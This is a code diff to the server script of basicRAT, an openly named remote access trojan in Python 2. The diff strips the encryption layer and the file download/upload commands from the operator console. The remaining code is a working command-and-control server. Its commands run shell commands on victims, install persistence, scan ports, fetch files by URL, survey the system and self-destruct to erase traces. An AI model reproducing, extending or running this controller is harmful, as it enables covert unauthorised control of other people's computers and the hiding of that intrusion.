@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
 
 #
 # basicRAT server
@@ -11,9 +10,6 @@ import readline
 import socket
 import sys
 import threading
-import time
-
-from core import common, crypto
 
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
@@ -28,10 +24,11 @@ BANNER = '''
 |_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
          https://github.com/vesche/basicRAT
 '''
+COMMANDS = [ 'client', 'clients', 'execute', 'help', 'kill', 'persistence',
+             'quit', 'scan', 'selfdestruct', 'survey', 'unzip', 'wget' ]
 HELP_TEXT = '''
 client <id>         - Connect to a client.
 clients             - List connected clients.
-download <file>     - Download a file.
 execute <command>   - Execute a command on the target.
 help                - Show this help menu.
 kill                - Kill the client connection.
@@ -41,16 +38,12 @@ scan <ip>           - Scan top 25 TCP ports on a single host.
 selfdestruct        - Remove all traces of the RAT from the target system.
 survey              - Run a system survey.
 unzip <file>        - Unzip a file.
-upload <file>       - Upload a file.
 wget <url>          - Download a file from the web.'''
-COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
-             'persistence', 'quit', 'scan', 'selfdestruct', 'survey',
-             'unzip', 'upload', 'wget' ]
+PROMPT = '\n[{}] basicRAT> '
 
 
 class Server(threading.Thread):
     clients      = {}
-    alive        = True
     client_count = 1
 
     def __init__(self, port):
@@ -74,15 +67,20 @@ class Server(threading.Thread):
         except (KeyError, ValueError):
             return None
 
-    # order is not retained. maybe use SortedDict here
     def get_clients(self):
-        return [v for k,v in self.clients.iteritems() if v.alive]
+        # order is not retained. maybe use SortedDict here
+        return [v for _,v in self.clients.iteritems() if v.alive]
 
     def remove_client(self, key):
         return self.clients.pop(key, None)
 
 
-class ClientConnection(common.Client):
+class ClientConnection():
+    def __init__(self, conn, addr, uid=0):
+        self.conn = conn
+        self.addr = addr
+        self.uid  = uid
+    
     alive = True
 
     def send(self, prompt):
@@ -98,34 +96,22 @@ class ClientConnection(common.Client):
             if raw_input('Remove all traces of basicRAT from the target ' \
                          'system (y/N)? ').startswith('y'):
                 print 'Running selfdestruct...'
-                self.sendGCM(prompt)
+                self.conn.send(prompt)
                 self.conn.close()
             return
 
         # send prompt to client
-        self.sendGCM(prompt)
+        self.conn.send(prompt)
         self.conn.settimeout(1)
 
         # kill client connection
         if cmd == 'kill':
             self.conn.close()
 
-        # download a file
-        elif cmd == 'download':
-            self.recvfile(action.rstrip())
-
-        # send file
-        elif cmd == 'upload':
-            self.sendfile(action.rstrip())
-
-        # regenerate DH key
-        # elif cmd == 'rekey':
-        #     self.dh_key = crypto.diffiehellman(self.conn)
-
         # results of execute, persistence, scan, survey, unzip, or wget
         elif cmd in ['execute', 'persistence', 'scan', 'survey', 'unzip', 'wget']:
             print 'Running {}...'.format(cmd)
-            recv_data = self.recvGCM().rstrip()
+            recv_data = self.conn.recv(4096)
             print recv_data
 
 
@@ -137,15 +123,12 @@ def get_parser():
 
 
 def main():
-    parser  = get_parser()
-    args    = vars(parser.parse_args())
-    port    = args['port']
-    client  = None
+    parser = get_parser()
+    args   = vars(parser.parse_args())
+    port   = args['port']
+    client = None
 
-    # print banner all sexy like
-    for line in BANNER.split('\n'):
-        time.sleep(0.05)
-        print line
+    print BANNER
 
     # start server
     server = Server(port)
@@ -155,9 +138,9 @@ def main():
 
     while True:
         try:
-            promptstr = '\n[{}] basicRAT> '.format(client.uid)
+            promptstr = PROMPT.format(client.uid)
         except AttributeError:
-            promptstr = '\n[{}] basicRAT> '.format('?')
+            promptstr = PROMPT.format('?')
 
         prompt = raw_input(promptstr).rstrip()
 
